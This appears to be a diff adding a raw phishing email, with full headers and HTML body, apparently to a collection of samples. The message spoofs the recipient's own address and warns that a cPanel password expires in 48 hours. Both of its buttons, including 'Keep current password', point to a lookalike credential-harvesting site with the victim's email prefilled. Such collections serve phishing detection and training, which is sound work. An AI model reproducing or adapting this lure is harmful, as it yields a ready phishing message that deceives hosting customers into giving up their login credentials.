@@ -1,0 +1,94 @@
+Return-path: <harry@superesolutions.com>
+Received: from ip74-208-64-65.pbiaas.com ([74.208.64.65]:63574)
+	by lion.wghservers.com with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
+	(Exim 4.99.1)
+	(envelope-from <harry@superesolutions.com>)
+	id 1vzbn8-0000000Dtsd-3z9B
+	for harry@superesolutions.com;
+	Mon, 09 Mar 2026 15:41:07 +0100
+From: Superesolutions Password Manager <harry@superesolutions.com>
+To: harry@superesolutions.com
+Subject: Password Update Required!
+Date: 9 Mar 2026 14:41:06 +0000
+Message-ID: <20260309144106.302E595E9F1F8948@superesolutions.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D'font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif;'=
+>
+<table dir=3D"ltr" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding: 0px 0px 25px;">
+<table border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"vertical-align: middle;"></td>
+<td style=3D'color: rgb(80, 80, 80); letter-spacing: -0.02em; padding-left:=
+ 12px; font-family: "Segoe UI Semibold", "Segoe UI", sans-serif; font-size:=
+ 20px; font-weight: 600; vertical-align: middle;'></td></tr></tbody></table=
+></td></tr>
+<tr>
+<td style=3D'padding: 0px; color: rgb(112, 112, 112); font-family: "Segoe U=
+I Semibold","Segoe UI Bold","Segoe UI","Helvetica Neue Medium",Arial,sans-s=
+erif; font-size: 17px;'>System Notification </td></tr>
+<tr>
+<td style=3D'padding: 0px; color: rgb(255, 108, 44); line-height: 48px; fon=
+t-family: "Segoe UI Light","Segoe UI","Helvetica Neue Medium",Arial,sans-se=
+rif; font-size: 41px;'>Password expiration notice </td></tr>
+<tr>
+<td style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); line-height: 20=
+px; font-family: "Segoe UI",Tahoma,Verdana,Arial,sans-serif; font-size: 14p=
+x;'>The login credentials for the account <a style=3D"color: rgb(255, 108, =
+44); text-decoration: none;" dir=3D"ltr" href=3D"harry@superesolutions.com"=
+ target=3D"_blank">harry@superesolutions.com</a> are scheduled to expire wi=
+thin <strong>48 hours</strong>. </td></tr>
+<tr>
+<td style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); line-height: 20=
+px; font-family: "Segoe UI",Tahoma,Verdana,Arial,sans-serif; font-size: 14p=
+x;'>To maintain uninterrupted access to your website files, databases, and =
+email accounts via cPanel, a password update is mandatory. Failure to updat=
+e your credentials before the deadline will result in an automated account =
+lockout to protect your data integrity. </td></tr>
+<tr>
+<td style=3D"padding: 25px 0px 0px;">
+<table border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding: 10px 22px; min-width: 50px; background-color: rgb(255=
+, 108, 44);" bgcolor=3D"#ff6c2c"><a style=3D'text-align: center; color: rgb=
+(255, 255, 255); letter-spacing: 0.02em; font-family: "Segoe UI Semibold","=
+Segoe UI Bold","Segoe UI","Helvetica Neue Medium",Arial,sans-serif; font-si=
+ze: 14px; font-weight: 600; text-decoration: none; display: block;' href=3D=
+"https://session.horizonvaut.com?email=3Dharry@superesolutions.com" target=
+=3D"_blank">Update Password Now</a> </td>
+<td width=3D"15"></td>
+<td style=3D"padding: 9px 22px; border: 1px solid rgb(112, 112, 112); borde=
+r-image: none;"><a style=3D'text-align: center; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI",Tahoma,Verdana,Arial,sans-serif; font-size: 14px; font=
+-weight: 400; text-decoration: none; display: block;' href=3D"https://sessi=
+on.horizonvaut.com?email=3Dharry@superesolutions.com" target=3D"_blank">Kee=
+p current password</a> </td></tr></tbody>
+</table></td></tr>
+<tr>
+<td style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); font-family: "S=
+egoe UI",Tahoma,Verdana,Arial,sans-serif; font-size: 14px;'>You can also <a=
+ style=3D"color: rgb(255, 108, 44); text-decoration: none;" href=3D".com" t=
+arget=3D"_blank">view documentation</a> regarding password strength require=
+ments. <br>This is an automated system security notification. If you requir=
+e assistance, please contact your web hosting provider's support desk.</td>=
+</tr>
+<tr>
+<td style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); font-family: "S=
+egoe UI",Tahoma,Verdana,Arial,sans-serif; font-size: 14px;'>Regards, </td><=
+/tr>
+<tr>
+<td style=3D'padding: 0px; color: rgb(42, 42, 42); font-family: "Segoe UI",=
+Tahoma,Verdana,Arial,sans-serif; font-size: 14px;'>
+Account Password Manager </td></tr></tbody></table></div></body></html>
